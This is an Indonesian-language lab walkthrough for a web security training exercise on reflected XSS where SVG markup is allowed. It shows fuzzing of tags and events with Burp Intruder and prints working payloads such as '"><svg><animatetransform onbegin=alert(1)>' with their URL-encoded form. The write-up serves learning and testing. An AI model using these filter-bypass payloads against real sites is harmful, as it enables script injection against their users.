# Lab 7 Reflected XSS with some SVG markup allowed

## Brief:
situs ini memblokir tag umum tapi tidak dengan SVG tag dan events

## Tujuan:
lakukan alert()


## Analisa:

1. lakukan xss: 

        <img src=1 onerror=alert(1)>
   
dan ini tidak berhasil

<img width="1913" height="1068" alt="1 xss standar" src="https://github.com/user-attachments/assets/60874794-519a-4d2f-a090-86063512c11d" />

2. kirim responsenya ke intruder dan set posisi jadi

> <$$>
> copy tag dari xss cheet sheat dan paste ke payload

<img width="1919" height="1077" alt="2 set posisi dan payload" src="https://github.com/user-attachments/assets/2642f8fa-1cf0-4503-bc6d-49315b36fa5a" />

3. start attack dan ketika selesai ada status code 200

       <img> <svg> <animatedtransform> <title>

<img width="1910" height="1077" alt="4 selesai status ok" src="https://github.com/user-attachments/assets/7956e407-1248-4caf-a25f-6e941eaea931" />

4. ke intruder lagi set posisi parameternya dan tambahkan posisi di

> copy event dari cheet shet lalu paste di payload dan start attack

    <svg><animatedtransform%20$$=1>

<img width="1918" height="1070" alt="5 parameter 2 posisi payload" src="https://github.com/user-attachments/assets/9dbd33a5-ad2c-439d-96e0-5f6bfae0bf4b" />

6. ketika selesai ada satu response yang status code 200 yaitu onbegin

<img width="1915" height="1079" alt="7 onbegin status ok" src="https://github.com/user-attachments/assets/e6ebeed2-4ff0-4807-a7ae-a9515a8234ef" />

7. masukan payload ke pencarian atau melalui url dengan parameter search:

       https://0a9c003b03c893108079955c00de0035.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

payload: 
  
    "><svg><animatetransform onbegin=alert(1)> 
    
dan encodenya 

    %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

<img width="1919" height="1079" alt="8 exploit dan berhasil" src="https://github.com/user-attachments/assets/84604801-08d3-4578-84b8-8616599f8d7d" />
